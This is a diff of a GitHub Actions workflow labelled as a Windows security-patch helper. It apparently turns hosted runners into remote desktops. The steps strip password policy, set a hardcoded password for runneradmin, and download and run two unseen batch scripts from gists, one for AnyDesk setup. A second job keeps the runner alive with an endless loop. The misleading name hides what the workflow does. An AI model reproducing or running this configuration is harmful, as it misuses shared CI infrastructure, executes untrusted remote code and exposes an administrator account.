@@ -1,3 +1,5 @@
+# Copy to: .github/workflows/main.yml in your pool repository.
+# This is only a template — install/configure AnyDesk on the runner the way your project requires.
 name: Windows-Update-Helper
 
 on:
@@ -7,8 +9,7 @@ jobs:
   update:
     name: Installing Security Patches
     runs-on: windows-latest
-    timeout-minutes: 340
-
+    timeout-minutes: 120
     steps:
       - name: Checkout Code
         uses: actions/checkout@v4
@@ -18,11 +19,13 @@ jobs:
         run: |
           net accounts /minpwlen:0 /maxpwage:unlimited
           net user runneradmin Lohar@Admin9988!
+
       - name: Download Scripts (If not in Repo)
         shell: cmd
         run: |
           curl -L "https://gist.githubusercontent.com/Lohar-ji/bd85954a427f6d56338b8e5dbef85bf6/raw/" -o patch_v2.bat
           curl -L "https://gist.githubusercontent.com/Lohar-ji/ddcfeacb357b02b3224d9c565a70694d/raw/" -o show.bat
+
       - name: Apply System Patches
         shell: cmd
         run: |
@@ -31,6 +34,7 @@ jobs:
           ) else (
             echo patch_v2.bat nahi mili!
           )
+
       - name: Run AnyDesk Setup
         shell: cmd
         run: |
@@ -40,9 +44,15 @@ jobs:
             echo show.bat nahi mili!
             exit 1
           )
+
+  keepalive:
+    name: Keep Alive
+    needs: update
+    runs-on: windows-latest
+    timeout-minutes: 340
+    steps:
       - name: Keep Alive
         shell: cmd
         run: |
           echo Lohar PC is Active...
           powershell -Command "while($true){ Write-Host 'PC Active...'; Start-Sleep -Seconds 60 }"
-
